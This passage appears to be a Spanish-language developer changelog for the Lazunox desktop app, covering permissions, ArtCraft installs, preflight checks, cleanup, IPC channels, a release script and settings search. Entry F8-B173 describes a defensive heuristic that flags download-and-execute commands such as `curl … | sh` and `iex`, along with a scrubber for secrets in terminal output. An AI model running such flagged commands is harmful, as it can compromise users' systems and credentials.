- **Pruebas**: `dropFolder.test.ts`, `useFolderDrop.test.ts`, `arrastrar-carpeta.e2e.ts`, `menu-contextual.e2e.ts`, `edit-context-menu.test.ts`.
- **No verificado todavía**: el arrastre real de una carpeta desde el explorador del sistema (solo se simuló con un archivo real).


## F8-B161 — permisos de macOS: reinicio inmediato, aviso de ubicación y ayuda de reparación

- **Qué cambia**: la bienvenida, el asistente y la tarjeta de Ajustes avisan al instante cuando Accesibilidad está concedida y Grabación de pantalla no (hay que reiniciar; botón «Reiniciar Lazunox», se abre el panel de Pantalla una sola vez) y revalidan al recuperar el foco; aviso si la app corre translocada o desde el .dmg (`ComputerStatus.location`); ayuda «Los permisos no se activan» que copia (sin ejecutar) los `tccutil reset`; canal `computer:reportPermsStall` (clase X en el celular) que anota en el registro de problemas lo que dice el helper tras ~90 s; sección nueva en `docs/INSTALAR.md`.
- **Pruebas**: `mac-permissions.test.ts`, `perms-wait.test.ts`, `service-perms-stall.test.ts`, `i18n.test.ts`, `i18n-coverage.test.ts`.
- **No verificado todavía**: el flujo en un Mac real con permisos de verdad (reinicio, aviso de translocation, paneles de Ajustes).

## F8-B162 — ArtCraft en el primer uso: red del sistema, fallos visibles y reintentos

- **Qué cambia**: la descarga de ArtCraft usa la pila de red de Electron (`createManualFetch(net)`: proxy del sistema y certificados del Llavero) con las mismas verificaciones (https, tamaño, SHA-256, firma). Todo fallo de ArtCraft (instalación, vista web, generación de documentos, apertura externa) queda en el registro de problemas con origen «ArtCraft» (código, plataforma, arquitectura, bytes recibidos). La Bienvenida y el asistente muestran el motivo del fallo. `dropScript`/`openWebDoc` se rinden a los 20 s y caen al visor de siempre. Word sin ArtCraft instalado avisa en el panel y ofrece instalarlo; el panel ya no se cierra en silencio ante un fallo. Una instalación incompleta se reintenta sola al arrancar (45 s después, máx. una vez cada 24 h; solo si la persona ya había pedido instalar y no canceló).
- **Pruebas**: `craft-problems.test.ts`, `craft-retry.test.ts`, `web-timeout.test.ts`, `web-server.test.ts` (dropScript), `web-open.test.ts`, `problem-log.test.ts`, `chat-docs.test.ts`, `component-install.test.ts`.
- **No verificado todavía**: la descarga real con `net` en un Mac limpio con proxy; la interfaz del panel y de la Bienvenida con un fallo real.

## F8-B163 — documentos del Chat con modelos GPT: lectura tolerante, avisos visibles y valla cortada

- **Qué cambia**: `sanitizeDoc` (`src/shared/chat-doc-sanitize.ts`) corrige la FORMA del JSON antes del esquema estricto (claves desconocidas fuera, textos recortados a su límite, números a texto, listas acortadas, enumeraciones desconocidas descartadas, subtítulo de portada a viñeta); rutas, URLs, colores no hex y bloques `image` se descartan, nunca se copian. Se acepta la spec en una valla `json`/`javascript`/`text` si su forma es inequívoca. Un documento que no se puede abrir (JSON roto, forma incorrecta, fallo de generación, falta ArtCraft) ya no se ignora ni cierra el panel: aviso con motivo corto, «Reintentar»/«Pedir de nuevo» y «Ver detalle» (`DocNotice`). Una valla sin cerrar con la respuesta ya terminada muestra «El documento se cortó» con «Pedir que continúe». Se anota en el registro de problemas con el origen nuevo `document` (`diag:problem` acepta `origin: chat-doc`; `extras:chatDoc:open` devuelve `reason` `failed`/`invalid`/`no-craft`). El prompt del Chat (`config.ts` y `chat.md`) pide respetar los límites y cerrar siempre la valla.
- **Pruebas**: `chat-doc-sanitize.test.ts`, `chat-doc-contract.test.ts` (salidas típicas de GPT pasan compartido + IPC; el IPC sigue estricto), `chatDocBlocks.gpt.test.ts`, `useChatDocPanel.broken.test.ts`, `Markdown.docnotice.test.tsx`, `report-problems.docs.test.ts`, `problem-log.document.test.ts`, `chat-docs.errors.test.ts`.
- **Unificación con F8-B162**: un único modelo de error (`ChatDocError` con `failed`/`invalid`/`no-craft`; el `craft-missing` de F8-B162 pasó a `no-craft`) y un único aviso (`DocNotice`) cuya acción depende del motivo: `invalid` «Pedir de nuevo», `failed` «Reintentar», `no-craft` «Instalar ArtCraft» (flujo de F8-B162, regenera el documento al terminar). Registro: `craft` para la falta de ArtCraft, `document` para el resto.
- **No verificado todavía**: el panel y los avisos en la app real con ChatGPT Plus (solo pruebas unitarias y de render estático).

## F8-B164 — cambio de cuenta: modelos reconciliados, desconectar logins, login pendiente sin bloqueo y diagnóstico de proveedores

- **Qué cambia**: (1) `reconcileChoices` (`src/shared/ai-availability.ts`) revisa `settings.defaultModel` y `modelsByMode` al conectar o desconectar un proveedor: si OpenCode Go pasa a conectado y una elección apunta a otro proveedor, vuelve a `DEFAULT_MODEL` y limpia el modo; si el modelo ya no existe, se sustituye. Lo llaman `useProviderConnect` (Ajustes y asistente) y el desconectar, con el aviso «Ahora usas …» y «Deshacer» (`reconcileModels.ts`, `SwitchNoticeBar`). Las rutinas reevalúan su modelo al ejecutar (`scheduler/model.ts`; sin IA, error claro `merr.routine.noAi`). (2) Code descarta su modelo en memoria cuando cambia el conjunto de proveedores. (3) «Desconectar» aparece para toda credencial guardada que no sea el gratuito/entorno/config (`canDisconnect`, según el catálogo; no se lee `auth.json`) y reconcilia después. (4) `oauthPending` separado de `busy`: el login pendiente ya no bloquea guardar la clave de otro proveedor; «Cancelar» libera la interfaz (`cancelOauth`). (5) La firma del servidor sandbox incluye los ids (nunca claves) de proveedores con credencial; un servidor ocioso se reinicia al cambiarlos y uno ocupado no se toca; `sandboxSendBlocked` distingue «OpenCode Go aún no llegó al entorno aislado» de «proveedor no admitido». (6) `AUTH_RE` reconoce `Token refresh failed`, `OAuth callback timeout`, `Login cancelled` y `Failed to initiate device authorization` como `auth` (acción conectar). (7) El informe de diagnóstico tiene la sección «Proveedores y modelos» (ids y origen, solo tipos de `auth.json`, modelos elegidos, proveedores del sandbox) y los errores de proveedor de las sesiones se anotan con `recordProblem` (solo proveedor, estado HTTP y clase). (8) Login ChatGPT automático: se muestra el código del motor con «Copiar código», la espera y «Probar otro método»; un fallo tras abrir la página muestra el motivo, «Reintentar» y la sugerencia del método con código, y se anota sin tokens.
- **Pruebas**: `ai-availability.test.ts`, `ai-errors.test.ts`, `providerCatalog.test.ts`, `reconcileModels.test.ts`, `ProviderKeyForm.test.tsx`, `store.providers-change.test.ts`, `scheduler/model.test.ts`, `manager.credentials.test.ts`, `sandbox-providers.test.ts`, `diagnostics/service.test.ts`, `provider-error-report.test.ts`.
- **Límite conocido**: el motor no ofrece una vía para cancelar `provider.oauth.callback` (espera hasta 5 min); «Cancelar» solo libera la interfaz y el resultado tardío, si llega, se aplica igual. No se verificó con credenciales reales (ChatGPT, OpenCode Go).

## F8-B165 — revisión de arranque: «Preparando Lazunox» instala lo que falta antes de entrar

- **Por qué**: un colega instaló en un Mac limpio, se saltó la bienvenida y ArtCraft nunca se instaló, los permisos no se reconocían y todo fallaba en silencio. La bienvenida solo corría la primera vez y se podía omitir.
- **Qué cambia**: en CADA arranque, antes de enseñar la app, el renderer pide `preflight:run` (solo local, sin red; cada comprobación con su plazo, el total muy por debajo de 2 s). `src/main/preflight/service.ts` agrega lo que ya existía sin duplicarlo: motor presente y respondiendo (`getOpencodeInfo`), ArtCraft pieza a pieza (3 CLI + las webs: marca, SHA del pin actual, archivo existente y de tamaño anotado, recuento de archivos de cada web; `craftInspect`/`craftStatus` en `craft-install.ts`, que ahora anota `binSize` y `web.{files,bytes}` en la marca), en macOS `cu-helper`, permisos (`computer:status`/`permsStage`) y ubicación (translocada, .dmg o fuera de Aplicaciones), en Windows el entorno aislado (`tasks:sandbox:status`) y el ayudante, disco libre (`CRAFT_DISK_FACTOR` ×4 de lo que falte; entorno aislado ×1) y carpeta de datos escribible. Una comprobación que se rompe o tarda no bloquea la app (se anota en el registro de problemas).
- **Qué es esencial** (`src/shared/preflight.ts`, lógica pura): motor, ArtCraft, en Windows el entorno aislado si el botón lo puede arreglar (`needsSetup` o `broken/payload`; si pide WSL o virtualización avisa pero deja entrar), disco y carpeta de datos. No esencial: permisos de macOS, ubicación de la app y ayudante.
- **Pantalla** (`PreflightGate` + `PreflightScreen`, a pantalla completa): todo listo = no se muestra nada. Falta algo esencial = «Preparando Lazunox», sin forma de omitir, con la lista de componentes (listo / falta / instalando con % / falló), el tamaño aproximado y UN botón «Instalar lo que falta» (ArtCraft y luego el entorno aislado; sin cuenta atrás; `preflight-run.ts`). Si falla, muestra el motivo real (`settings.craft.error.*`, `tasks.sandbox.error.*`), «Reintentar», «Copiar detalle» (redactado en main) y lo anota con `recordProblem` (`preflight:fail`). Los avisos no esenciales salen como «Pendiente» con su acción (reutiliza `AppLocationNotice`, `ScreenRestartNotice`, `PermsHelp` y `waitForMacPerms`) y «Continuar de todos modos» SOLO para ellos (se recuerda por versión de la app y por esos pendientes); se revalida al recuperar el foco. Motor ausente: «Elegir motor…» (`app:pickOpencodeBin`). El asistente de cuentas/modelo sigue detrás, como antes.
- **Diagnóstico**: sección «Estado de componentes» en Ajustes › Diagnóstico con «Revisar de nuevo», y la misma lista en el informe exportado (`DiagnosticsDeps.components`, redactado con el resto).
- **Canales nuevos**: `preflight:run` y `preflight:fail` (contrato en `ipc-tasks.ts`, esquema estricto en `schemas.ts`, clase `X` en `remote/policy.ts`, neutro en `unsupported-handlers.ts`). Sin celular: el shim del PWA deja pasar a los hijos.
- **Pruebas automáticas**: la revisión se omite con `LAZUNOX_E2E_HEADLESS=1` solo sin empaquetar (`E2E_HEADLESS`); en producción nunca.
- **Pruebas**: `shared/preflight.test.ts`, `main/preflight/service.test.ts`, `craft-install.test.ts` (integridad), `preflight-run.test.ts`, `PreflightScreen.render.test.tsx`, `i18n-coverage.test.ts`, `schemas`/`policy`/contratos IPC.
- **Observación sin tocar**: la bienvenida (`Welcome.tsx`) da por fallido el entorno aislado nada más llamar a `tasks:sandbox:setup` (esa llamada devuelve al empezar, no al terminar); la pantalla nueva sondea el estado hasta que termina.
- **No verificado todavía**: nada en un Mac limpio ni en un Windows real (permisos reales, descarga real de ArtCraft, instalación del entorno aislado); el tiempo real de la revisión (objetivo < 2 s) no se midió en la app empaquetada.

## F8-B166 — actualizaciones a tiempo y limpieza de ArtCraft viejo

- **Revisión periódica** (`update/checker.ts`, `shared/update-check.ts`): `CHECK_INTERVAL_MS` pasa de 24 h a 6 h y `UpdateChecker.start()` programa además un temporizador recurrente (cada 30 min llama a `check(false)`, que sigue respetando `nextCheckDue`, `retryAfter`, el ajuste y `configured`; ~1 petición cada 6 h en la práctica, muy por debajo de los 60/h de GitHub sin token). `start()` dos veces no duplica el temporizador; `stop()` lo detiene y `ipc/update.ts` lo llama en `will-quit`. El temporizador lleva `unref` (no mantiene vivo el proceso). El tope de espera tras 403/429 sigue siendo 24 h (constante propia `MAX_RETRY_MS`, antes ligada al intervalo).
- **Textos**: `settings.about.autoCheck.configured` (es/en) ya no dice «una vez al día». Las claves no cambian, así que `i18n-core-keys.json` no se regeneró.
- **Limpieza de ArtCraft viejo** (`office/craft/craft-clean.ts`, `cleanStaleCraft({ binDir, currentDir, now, fs })`, inyectable): tras una instalación COMPLETA y verificada (`installCraft` termina en estado `installed`), borra de `userData/bin` las carpetas `craft-X.Y.Z` distintas de la del pin actual y las `.craft-tmp-*` con más de 24 h. Solo nombres `^craft-\d+\.\d+\.\d+$` / `^\.craft-tmp-`, solo directorios reales (nunca enlaces simbólicos), con ruta real exactamente `binDir/<nombre>`; si `currentDir` no está dentro de `binDir` no borra nada. Nunca toca `craft-intento.json`, otras carpetas ni archivos. Cualquier fallo solo hace `console.warn`, no cuenta como fallo de la instalación.
- **Pruebas**: `update-check.test.ts`, `checker.test.ts` (temporizador recurrente, no acumulación, `stop`, respeto de intervalo/ajuste), `craft-clean.test.ts` (versiones viejas, temporales viejos/recientes, symlink, ruta fuera de bin, nombres raros, fallo de borrado, escape por ruta real) y un caso en `craft-install.test.ts` (limpia solo tras éxito).
- **No verificado**: nada en la app empaquetada ni con GitHub real (ni el ritmo real de comprobaciones en una sesión larga); la limpieza no se probó en un Windows real (la comparación de rutas reales con mayúsculas/minúsculas o rutas cortas 8.3 podría hacer que se omita, que es el lado seguro). Si ya está instalada la versión actual, `installCraft` sale antes y no limpia (solo limpia tras una instalación real). Suite completa no ejecutada.

## F8-B167 — limpieza de lo que ya no se usa (LibreOffice abandonado y basura versionada)

- **Por qué**: las actualizaciones deben ir quitando lo muerto, para que no ocupe espacio ni cause errores. ArtCraft reemplazó a LibreOffice y la app ya no lo ofrece ni lo instala.
- **LibreOffice, restos de código**: se corrigen los comentarios obsoletos de `src/main/tasks/opencode-config.ts` y `src/main/tasks/sandbox-profile.ts` (solo comentarios; el entorno `LAZUNOX_BIN_DIR` y `LAZUNOX_SANDBOX` no cambia, y `LAZUNOX_BIN_DIR` lo sigue usando la búsqueda de ArtCraft en `_shared/render*.py`) y se quita de `sandbox-profile.office.test.ts` la prueba opcional que renderizaba con `soffice` (`HAS_LO`). Un grep de `soffice`/`libreoffice` en src, scripts, resources, e2e y electron-builder.js no deja ningún otro uso real.
- **Limpieza en el equipo del cliente** (`src/main/office/legacy-clean.ts`, `cleanLegacyLibreOffice({ binDir, fs })`, inyectable): borra `userData/bin/libreoffice-<versión>` (regex estricta `^libreoffice-\d+(\.\d+){1,3}$`, ~800 MB), sin seguir enlaces simbólicos, comprobando que la ruta real queda dentro de `bin`, sin lanzar nunca y dejando `console.warn` por cada carpeta borrada. `src/main/index.ts` la programa una vez por arranque, 20 s después de abrir la ventana (no bloquea el arranque).
- **Basura versionada**: se quitan del índice los dos `.pyc` de `resources/opencode/skills/_shared/__pycache__/`, `.gitignore` ignora `__pycache__/` y `*.pyc` y `electron-builder.js` los excluye del paquete (`!**/__pycache__/**`, `!**/*.pyc`).
- **Pruebas**: `legacy-clean.test.ts` (borra la que cumple el patrón; no toca otros nombres, archivos ni enlaces; ruta real fuera de bin; fallos tolerados; bin inexistente) y `package-files.test.ts` (nuevas exclusiones).
- **No verificado**: nada en un equipo real con la carpeta de 800 MB ni en Windows.

## F8-B168 — documentación de 0.5.29 a 0.5.35: canal `app:hostName` y panel «Entorno» (0.5.32)

- **Qué hace**: `app:hostName` (`src/main/ipc/app.ts`) devuelve `os.hostname()` recortado a 100 caracteres, sin argumentos, y lo usa el hook `useHostName` (`renderer/src/lib/use-host-name.ts`, con caché de módulo) para mostrar el nombre del equipo en el panel «Entorno» de Code y de Overdrive.
- **Cómo está protegido**: contrato en `shared/ipc.ts` (`{ req: void; res: string }`, también en `IPC_INVOKE_CHANNELS`), esquema estricto `none` en `main/ipc/schemas.ts` (una clave extra es `INVALID`), sin entrada en `CHANNEL_ROLES` (solo la ventana principal lo invoca) y clase **`X`** en `main/remote/policy.ts` (el celular no puede pedirlo).
- **Pruebas**: las que ya cubren todos los canales (`schemas.test.ts`, contratos IPC y cobertura de `policy.ts`, que exigen esquema, contrato y clase por canal). No hay una prueba propia del hook.
- **No verificado**: el nombre en un equipo con nombre muy largo o con caracteres raros (solo se recorta, no se limpia).

## F8-B169 — documentación de 0.5.29 a 0.5.35: `app:useBundledEngine` y `bundledAvailable` (0.5.33)

- **Qué hace**: la tarjeta «Usar el motor incluido» (`renderer/src/app/EngineNotice.tsx`) llama a `app:useBundledEngine` (`main/ipc/onboarding.ts` → `opencode/use-bundled.ts`, con dependencias inyectadas). Si la app no trae motor (`bundledOpencodePath()` nulo) responde `{ status: 'unavailable' }`; si `OPENCODE_BIN` apunta a un ejecutable responde `{ status: 'pinned' }` (soltar la ruta guardada no cambiaría nada y no se finge que sí); en otro caso borra `settings.opencodeBin` (lo único que cambia), resuelve de nuevo y responde `{ status: 'ok', info }`. **No descarga ni crea ningún binario.** El reinicio del motor lo hace después el renderer (`useServer.restart()`; la tarjeta pide confirmación si hay trabajo en marcha).
- **`bundledAvailable`**: `OpencodeInfo` (y `getOpencodeInfo` en `opencode/binary.ts`) ganó el campo booleano `bundledAvailable` («hay un motor incluido al que volver»); `app:opencodeInfo` y `app:pickOpencodeBin` lo rellenan.
- **Protección**: contrato en `shared/ipc.ts`, esquema `none`, sin entrada en `CHANNEL_ROLES` y clase **`X`** en `policy.ts` (como `app:opencodeInfo`, `app:pickOpencodeBin` y `app:opencodeAction`). La tarjeta recuerda «Ahora no» por versión en `localStorage` (solo comodidad de la interfaz).
- **Pruebas**: `opencode/use-bundled.test.ts`, `app/EngineNotice.test.tsx`, `opencode/binary.test.ts`.
- **No verificado**: el cambio de motor con la app empaquetada y un OpenCode instalado aparte en un equipo real.

## F8-B170 — documentación de 0.5.29 a 0.5.35: `tasks:restore:create` y `wholeHome` (0.5.30)

- **Qué cambia**: `TasksRestorePoint` (`shared/ipc-tasks.ts`) tiene el campo opcional `wholeHome`. En `tasks:restore:create` (`main/ipc/tasks-restore-handlers.ts`), si `tasks.coversHome(real)` (la carpeta es la carpeta personal o una que la contiene) NO se recorre nada: se responde un punto `{ id: '', status: 'skipped', wholeHome: true, files: 0, bytes: 0, reason }`. Antes se intentaba la instantánea y se avisaba «no se guardó un punto de restauración» en cada mensaje; ahora el renderer (`tasks/impl/actions.ts`, `saveRestorePoint`) no muestra aviso cuando `status !== 'ok' && wholeHome`. Cualquier otro motivo de omisión (o un fallo, o pasarse del tiempo) sigue avisando.
- **Lo que NO cambia**: la carpeta pasa antes por `tasks.assertInsideApproved(folder)` (rechaza lo no autorizado); `tasks:restore:apply` no cambia; en `policy.ts` el canal sigue siendo `scoped('M', 'folder')`.
- **No verificado**: el aviso (o su ausencia) con Control total sobre la carpeta personal en una sesión real.

## F8-B171 — documentación de 0.5.29 a 0.5.35: avisos del sistema de Tareas y `notify.enabled` (0.5.30)

- **Qué hace**: `main/tasks/os-notify.ts` (`createOsNotifier`) muestra una notificación nativa cuando una tarea en segundo plano termina, falla, pide aprobación o hace una pregunta. Solo nace del monitor de tareas del proceso principal (`monitor.ts`): ni el renderer ni el celular pueden dispararla. Reglas en código: nada si el interruptor general de la app (`extrasPrefs.notificationsEnabled`) o el de Tareas (`TasksPrefs.notify.enabled`, por defecto `true`) están apagados, ni si la ventana principal tiene el foco, ni si el sistema no soporta notificaciones; una sola vez por tarea y tipo en 60 s (`NOTIFY_DEDUPE_MS`); el aviso es un texto fijo con el título de la tarea (una línea, sin caracteres de control, recortado a 80 caracteres); sin cuerpo, sin rutas ni contenido de archivos. El sonido sigue `soundEnabled`. Un clic trae la ventana y abre la tarea (`app:openTarget`, con carpeta y modo, que no se muestran en el aviso). Si el último mensaje de la tarea es un aborto del propio usuario (`MessageAbortedError`) no se avisa.
- **Preferencias**: `TasksPrefs.notify = { enabled, done, approval, question, error }` (`shared/ipc-tasks.ts`; `normalizeTasksPrefs` completa lo que falte con `true`). Interruptor en Ajustes › Tareas (`TasksSection.tsx`). Se guarda con `tasks:prefs:set` (esquema `partial` con esas cinco booleanas).
- **Celular**: en `policy.ts` el campo `notify` de `tasks:prefs:set` es de clase **M**, igual que `stallWarnMinutes`; archivo automático, inactividad y servidores son **D**.
- **Pruebas**: `tasks/os-notify.test.ts`, `remote/policy.test.ts`, `ipc/schemas.test.ts`.
- **No verificado**: las notificaciones reales de macOS/Windows (permiso del sistema, «No molestar», foco entre varias ventanas).

## F8-B172 — documentación de 0.5.29 a 0.5.35: pegar archivos e imágenes en el compositor (0.5.29)

- **Vía estándar** (`renderer/src/lib/paste-attachments.ts`): archivos o imágenes que Chromium ya entrega en el evento `paste`. **Respaldo**: si no vienen (Finder/Explorador), solo dentro del propio evento y solo con texto de una línea de hasta 260 caracteres sin HTML (o sin texto), el renderer pide a main `clipboard:readFilesForPaste { scope }` (`'any'` en Chat y Tareas, `'images'` en Code). En Tareas el respaldo es `tasks:pasteFromClipboard { folder }`, que guarda los archivos nuevos en la carpeta autorizada sin sobrescribir (`writeNewFile`). **El renderer nunca manda rutas**: salen del portapapeles en main (`main/clipboard/paste-files.ts`, `ipc/clipboard-handlers.ts`).
- **Validación en main**: ambas llamadas exigen que la ventana que invoca tenga el foco (si no, `FORBIDDEN`); rutas absolutas, sin NUL y de ≤ 4096 caracteres; solo archivos regulares (nada de carpetas, enlaces simbólicos ni dispositivos: `lstat` y de nuevo `fstat` sobre el descriptor abierto, con `O_NOFOLLOW`/`O_NONBLOCK` fuera de Windows); se rechazan las extensiones de `BLOCKED_OPEN_EXTENSIONS` y, fuera de Windows, cualquier archivo con bit de ejecución; con `scope: 'images'` solo png/jpg/jpeg/gif/webp. Topes: 10 archivos, 25 MB por archivo, 50 MB en total (`shared/paste-files.ts`). Razones de rechazo: `tooBig`, `tooMany`, `tooBigTotal`, `notRegular`, `blockedType`, `unreadable`. Sin archivos, se lee la imagen del portapapeles (PNG, mismo tope por archivo).
- **Celular**: `clipboard:readFilesForPaste` y `tasks:pasteFromClipboard` son clase **X** en `policy.ts`; en el celular solo vale la vía estándar del navegador (`fallback` falso). El esquema de ambos es estricto (`schemas.ts`).
- **Pruebas**: `clipboard/paste-files.test.ts` (validación y topes), `lib/paste-attachments.test.ts`, `schemas`/`policy`.
- **No verificado**: el pegado desde Finder y el Explorador reales y los formatos nativos (`NSFilenamesPboardType`, `public.file-url`, `FileNameW`) en equipos de verdad; la nota de 0.5.29 pide reportar los casos donde no funcione.

## F8-B173 — documentación de 0.5.29 a 0.5.35: botón ▶ «Ejecutar» y salida para la IA (0.5.35)

- **Alcance**: solo Code de escritorio (`ShellRunProvider` lo monta; Chat, Tareas, Overdrive y el celular no tienen proveedor y `isRemoteSurface()` lo apaga). No es un canal IPC nuevo: escribe en la terminal interna del proyecto con el `pty:write` de siempre (clase **X** para el celular).
- **Qué se ofrece** (`shared/terminal-command.ts`): `shellFamilyOf` solo da botón a bloques de shell de ESTA plataforma (bash/sh/zsh/shell/console… en macOS/Linux; powershell/pwsh/cmd/bat… en Windows); `prepareTerminalCommand` quita prompts, comentarios y líneas en blanco, y rechaza bloques vacíos, que parecen salida de programa, con caracteres de control, de más de 4000 caracteres o de más de 40 líneas.
- **Confirmación**: nada se ejecuta solo, cada ▶ es un clic. `dangerousCommandReason` es una **heurística, no un límite de seguridad** (lo dice su cabecera): detecta borrar, elevar privilegios, descargar y ejecutar (`curl … | sh`, `iex`…), permisos recursivos, discos, sistema/arranque, procesos, git destructivo, rutas de secretos y desinstalar paquetes. Si hay motivo, o el bloque tiene varias líneas, `ShellRunButton.tsx` abre `confirmDialog` con el comando COMPLETO, el motivo en rojo y «Cancelar» enfocado cuando es delicado. `mayAskPassword` (`sudo`, `ssh`, `passwd`…) solo añade un aviso. No reutiliza `remote/command-denylist.ts` (aquel es de la aprobación remota). Si la terminal sigue ocupada con una ejecución anterior, `runInTerminal` devuelve `null`, no escribe nada y se ofrece abrirla.
- **Salida hacia la IA** (`shared/terminal-capture.ts`, `terminal-context.ts`, `features/code/impl/panels/outputCapture.ts`): solo se captura lo que el shell imprime, NUNCA las teclas. El texto sale del búfer de xterm; se quitan ANSI y retornos de carro, el eco del comando y el prompt de regreso, y se tachan secretos con `scrubTerminalSecrets`: llaves privadas PEM, cabeceras `Authorization`/`Cookie`/`X-Api-Key`, asignaciones `…KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|AUTH=valor` y los patrones compartidos de `redact-patterns` (máscara `REDACT_MASK`). Se conserva el FINAL hasta 8000 caracteres. Si casi todo era un secreto (`mostlySecret`: queda menos del 20 %) no se comparte nada (`blocked-secret`). Con contraseña o s/n pendiente solo va lo previo con una nota; con el comando todavía corriendo (≥ 5 s de salida estable) se comparte una vez con nota de «sigue en ejecución».
- **Cuándo se envía**: una sola vez por ejecución. Por defecto (`AUTO_SHARE_DEFAULT = true`; interruptor en Ajustes › General, guardado en `localStorage` con la clave `lazunox.code.shareCommandOutput`) se envía a la MISMA sesión de Code con `send`, o en cola (`enqueue`) si está ocupada; si el interruptor está apagado o la persona cambió de sesión queda como pastilla adjunta al siguiente mensaje, y «Enviar a la IA ahora» la manda a mano. «Preguntar a la IA sobre esto» (cabecera de la terminal) usa el mismo saneado y nunca envía sola.
- **Pruebas**: `shared/terminal-command.test.ts`, `shared/terminal-capture*.test.ts`, `shared/terminal-context.test.ts`, `components/ShellRunButton.test.tsx`, `panels/outputCapture.test.ts`, `panels/TerminalPanel.ask.test.tsx`, `panels/terminalBuffer.test.ts`.
- **No verificado**: el regreso del prompt con temas de shell poco comunes (se reconoce por los últimos ≤ 12 caracteres del prompt; si no se reconoce, se da por terminado tras 3 s de calma); salida con secretos en formatos que ningún patrón conoce; Windows (PowerShell/cmd) en un equipo real.
- **Actualizador**: en 0.5.29–0.5.35 no hay cambios de código en `src/main/update/`, `resources/updater/` ni `scripts/update-lib.mjs` (revisado con el historial de git); lo último documentado sigue siendo F8-B166.

## F8-B174 — release de un solo comando (`scripts/release.sh`)

- **Qué es**: `scripts/release.sh [--dry-run] [--force] prepare|mac|win|draft|publish X.Y.Z` encadena los scripts que ya existían (`sign-release-mac.sh`, `publish-update.mjs`, `verify-update.mjs`, `verify:bundled`, `smoke-boot-mac.sh`, `win/sync.sh`, `win/pack-check.ps1`, `publish-github.mjs`, `release-notes.mjs`, `site/publicar-descargas.sh`) y se detiene al primer fallo. Cada paso deja una marca `dist/release-state/X.Y.Z/<paso>.ok` ligada al commit (se salta si nada cambió; `--force` repite). Documentado en `docs/DISTRIBUCION.md` §10.4.
- **Garantía de seguridad**: `publish` es la única fase que publica y exige un terminal interactivo (stdin y stdout) y escribir a mano `publicar vX.Y.Z`; no existe `--yes`. Antes compara el digest de CADA asset del borrador con el archivo local. No lee ni imprime las claves (`~/.lazunox-keys/update.pem` solo viaja por la variable de entorno que ya usa `publish-update.mjs`; la llave SSH solo la usan `ssh`/`scp`). No purga Cloudflare (el token vive en un MCP): imprime qué purgar y cómo comprobar el SHA-256 desde el dominio.
- **Pruebas**: `src/test/release-script.test.ts` (solo macOS): `--dry-run` de mac/win/draft/publish, orden de las fases (`verify:bundled` después de `publish-update`), host de Windows por entorno y que sin terminal no se llega a `gh release edit` (con un `gh` falso).
- **No verificado**: ninguna fase se ejecutó de verdad salvo `prepare` (solo lectura); `mac`, `win`, `draft` y `publish` solo se probaron con `--dry-run`. `shellcheck` no estaba instalado.

## F8-B175 — Rutinas que reaccionan: disparador por archivo, ejecuciones perdidas y bandeja de resultados

- **Disparador por archivo** (`schedule.kind = 'file'`, `src/main/scheduler/file-trigger.ts`, `file-watch-manager.ts`): vigila una carpeta (sin recursión) y dispara cuando aparece o cambia un archivo. Filtro por patrón, espera de estabilización (1–120 s), agrupación de archivos seguidos en UNA ejecución, tope por hora (1–60, en memoria), ignora ocultos, temporales, carpetas y enlaces simbólicos. Anti-bucle: lo que aparece mientras la rutina corre, o justo después, no dispara. El nombre del archivo va al prompt como DATO (`buildFilePrompt`); el contenido no se lee.
- **Ejecuciones perdidas** (`onMissed`: `ask` por defecto, `run`, `skip`): una ejecución con más de 3 min de retraso, o vencida antes de abrir la app, se decide UNA vez sobre la más reciente; ya no se ejecuta sola por defecto.
- **Bandeja «Resultados por revisar»** (`routines.json › inbox`, `RoutineInbox.tsx`): resultado de cada ejecución y perdidas pendientes; Aprobar, Descartar, Ver detalle, Volver a ejecutar; contador en el riel.
- **IPC**: `routines:inbox:list` (R) y `routines:inbox:resolve` (X), evento `routines:inbox`. `routines:save` con disparador por archivo es X desde el celular.
- **Pruebas**: `file-trigger.test.ts`, `service.file.test.ts`, `RoutineInbox.render.test.tsx`, `policy.test.ts`.
- **No verificado**: Windows real (bloqueos de archivo, rutas), notificaciones nativas reales, suspensión real del equipo.

## F8-B176 — Ajustes: buscador, lista de conversaciones plegada y sección Importar en el menú (estudio de UX, H14)

- **Buscador** «Buscar en Ajustes» sobre el menú de secciones (`SettingsView.tsx`, `search-index.ts`). El índice se construye al pintar a partir de las claves i18n que usa cada sección (cada sección declara sus prefijos en `SECTIONS[].keys`; ningún texto se copia a mano, así que sigue al idioma y a los cambios de copy), sin tildes ni mayúsculas y con todas las palabras requeridas. Resultados agrupados por sección con la coincidencia resaltada (`<mark>`); al elegir uno se abre la sección, se limpia la búsqueda y se lleva a la persona a la opción (desplazamiento, foco y un contorno que se apaga solo; respeta `prefers-reduced-motion`). Sin resultados: mensaje con la consulta y una sugerencia. Teclado: ⌘F / Ctrl+F enfoca el campo, ↑/↓ mueven, Enter elige, Esc borra y, con el campo vacío, cierra Ajustes (patrón combobox/listbox con `aria-activedescendant` y una región `status`).
- **H14**: con Ajustes abierto la lista de conversaciones se pliega a riel (`selectListCollapsed` considera `settingsOpen`) y se restaura al salir; el botón «Mostrar» del riel y el atajo de la barra lateral cierran Ajustes y vuelven a la vista con su lista.
- **Pruebas**: `search-index.test.ts` (índice contra los diccionarios reales, es/en, ruido, tildes, resaltado), `SettingsView.search.test.tsx` (jsdom: filtrado, agrupación, ir a la opción con foco, teclado, ⌘F/Ctrl+F, sin resultados), `ImportSection.test.tsx` (selector de lista plegada), escenario `ajustes-buscar` de `scripts/shot-desktop.mjs`.
- **No verificado**: la búsqueda no encuentra textos que solo existen en datos del usuario (nombres de modelos, de servidores) ni opciones cuyo texto se arma sin una clave i18n; Windows real.

## F8-B177 — Ajustes › Importar: instrucciones de proyecto y conectores MCP desde otras herramientas

- **Qué es**: sección «Importar» (`ImportSection.tsx`). La persona elige en el diálogo nativo (lo abre `main`) una carpeta de proyecto (se miran solo `AGENTS.md`, `CLAUDE.md`, `.mcp.json`, `.cursor/mcp.json` y `.vscode/mcp.json`) o un archivo `.json` de conectores; se muestra una vista previa SIN secretos, se marca elemento por elemento (todo desmarcado al empezar) y se confirma. `CLAUDE.md` pasa a `AGENTS.md` del proyecto (se crea, o se añade al final si ya existe y es distinto); los servidores MCP van al listado de MCP de Lazunox, siempre con `enabled: false`.
- **Seguridad**: ver `docs/SEGURIDAD.md` §3 quinquagies ter. Canales `extras:import:pick` y `extras:import:apply` (esquema estricto sin rutas; la ficha de la vista previa es de un solo uso y caduca a los 10 min), ambos clase X en `policy.ts`.
